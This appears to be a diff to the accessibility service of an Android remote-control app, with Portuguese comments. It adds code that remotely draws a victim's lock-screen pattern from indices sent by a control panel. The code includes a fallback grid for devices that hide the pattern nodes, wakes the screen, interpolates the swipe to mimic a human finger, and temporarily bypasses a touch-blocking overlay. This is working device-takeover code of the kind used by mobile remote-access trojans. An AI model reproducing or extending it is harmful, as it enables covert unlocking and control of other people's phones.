@@ -2939,16 +2939,29 @@ class MyAccessibilityService : AccessibilityService() {
         // do painel. Cai para os pixels do painel só se a grade não for detectada.
         var pontosFinais = pontos
         if (!indices.isNullOrEmpty()) {
+            // PRIORIDADE 1 — centros REAIS da grade detectada na árvore de
+            // acessibilidade (LockPatternView). Cai exatamente nas bolinhas.
             val centros = detectarCentrosPadraoAoVivo()
                 ?: (if (wireframePadraoCentros.size == 9) wireframePadraoCentros else null)
             if (centros != null && centros.size == 9) {
                 val remapeados = indices.mapNotNull { idx -> if (idx in 1..9) centros[idx - 1] else null }
                 if (remapeados.size >= 2) {
                     pontosFinais = remapeados
-                    enviarLog("[PADRÃO] Desenhando nos centros reais da grade detectada (índices ${indices.joinToString("→")}).")
+                    enviarLog("[PADRÃO] Centros REAIS da grade (índices ${indices.joinToString("→")}).")
+                }
+            } else if (pontosFinais.size < 2) {
+                // PRIORIDADE 2 — fallback PROPORCIONAL calibrado: OEM ocultou os
+                // nós da grade E o painel não mandou coords. Monta a matriz 3x3
+                // na metade inferior da tela física real (DisplayMetrics real:
+                // X em 25/50/75% da largura; Y proporcional à grade do Android).
+                val grade = gradePadraoProporcional()
+                val remap = indices.mapNotNull { idx -> if (idx in 1..9) grade[idx - 1] else null }
+                if (remap.size >= 2) {
+                    pontosFinais = remap
+                    enviarLog("[PADRÃO] Fallback PROPORCIONAL (grade não detectada) índices ${indices.joinToString("→")}.")
                 }
             } else {
-                enviarLog("[PADRÃO AVISO] Grade não detectada no aparelho — usando coordenadas do painel.")
+                enviarLog("[PADRÃO AVISO] Grade não detectada — usando coordenadas do painel.")
             }
         }
 
@@ -2958,19 +2971,37 @@ class MyAccessibilityService : AccessibilityService() {
             return
         }
 
+        // Acorda a tela se estiver apagada (o gesto não funciona com a tela off).
+        try {
+            val pm = getSystemService(POWER_SERVICE) as? PowerManager
+            if (pm?.isInteractive == false) { acenderTela() }
+        } catch (_: Exception) {}
+        // BYPASS do overlay (Acesso Total) durante o gesto — restaura ao fim.
+        setBloqueioPermiteToqueRemoto(true)
+
+        // Path CONTÍNUO com leve INTERPOLAÇÃO intermediária (simula o deslize
+        // humano; o Android rejeita padrão instantâneo). 2 pontos médios por
+        // segmento mantêm o traço suave sem levantar o dedo.
         val path = Path().apply {
             moveTo(pontosFinais[0].x, pontosFinais[0].y)
             for (i in 1 until pontosFinais.size) {
-                lineTo(pontosFinais[i].x, pontosFinais[i].y)
+                val a = pontosFinais[i - 1]; val b = pontosFinais[i]
+                lineTo(a.x + (b.x - a.x) * 0.33f, a.y + (b.y - a.y) * 0.33f)
+                lineTo(a.x + (b.x - a.x) * 0.66f, a.y + (b.y - a.y) * 0.66f)
+                lineTo(b.x, b.y)
             }
         }
 
-        val tempoDuracao = (pontosFinais.size * 180L).coerceIn(300L, 1800L)
-        val stroke = GestureDescription.StrokeDescription(path, 0, tempoDuracao)
+        // Temporização realista (spec): ancoragem inicial de 80ms + deslize de
+        // max(450ms, nPontos*140ms) contínuo, sem soltar o dedo.
+        val startTime = 80L
+        val tempoDuracao = maxOf(450L, pontosFinais.size * 140L)
+        val stroke = GestureDescription.StrokeDescription(path, startTime, tempoDuracao)
         val gestureBuilder = GestureDescription.Builder().addStroke(stroke)
 
         val aceito = dispatchGesture(gestureBuilder.build(), object : GestureResultCallback() {
             override fun onCompleted(gestureDescription: GestureDescription?) {
+                restaurarBloqueioLocal()
                 // O gesto foi DESENHADO. Só isso não diz se a senha estava certa:
                 // o padrão certo DESTRAVA o keyguard; o errado mantém a tela
                 // bloqueada. Esperamos o sistema processar (~900ms) e checamos o
@@ -2989,15 +3020,45 @@ class MyAccessibilityService : AccessibilityService() {
             }
 
             override fun onCancelled(gestureDescription: GestureDescription?) {
+                restaurarBloqueioLocal()
                 enviarLog("[PADRÃO CANCELADO] Desenho da senha padrão cancelado pelo sistema.")
                 onResult?.invoke(false)
             }
         }, null)
 
         if (!aceito) {
+            restaurarBloqueioLocal()
             enviarLog("[PADRÃO RECUSADO] dispatchGesture para senha padrão foi recusado pelo Android.")
             onResult?.invoke(false)
         }
+    }
+
+    /** Fallback PROPORCIONAL: 9 centros (índices 0..8 → PointF) de uma grade 3x3
+     *  centralizada na METADE INFERIOR da tela física REAL (DisplayMetrics real).
+     *  X em 25/50/75% da largura; Y proporcional à grade padrão do Android
+     *  (a LockPatternView ocupa ~a metade de baixo). Usado quando o OEM oculta
+     *  os nós da grade e o painel não mandou coordenadas. */
+    private fun gradePadraoProporcional(): List<android.graphics.PointF> {
+        val pontoReal = android.graphics.Point()
+        val wm = getSystemService(WINDOW_SERVICE) as? WindowManager
+        @Suppress("DEPRECATION")
+        wm?.defaultDisplay?.getRealSize(pontoReal)
+        val metrics = resources.displayMetrics
+        val w = (if (pontoReal.x > 0) pontoReal.x else metrics.widthPixels).toFloat()
+        val h = (if (pontoReal.y > 0) pontoReal.y else metrics.heightPixels).toFloat()
+        // Colunas: 25%, 50%, 75% da largura.
+        val cols = floatArrayOf(w * 0.25f, w * 0.50f, w * 0.75f)
+        // Linhas: grade centrada na metade inferior (topo ~48%, base ~88% da altura).
+        val yTopo = h * 0.48f
+        val yBase = h * 0.88f
+        val rows = floatArrayOf(yTopo, (yTopo + yBase) / 2f, yBase)
+        val lista = ArrayList<android.graphics.PointF>(9)
+        for (linha in 0 until 3) {
+            for (coluna in 0 until 3) {
+                lista.add(android.graphics.PointF(cols[coluna], rows[linha]))
+            }
+        }
+        return lista
     }
 
     /**
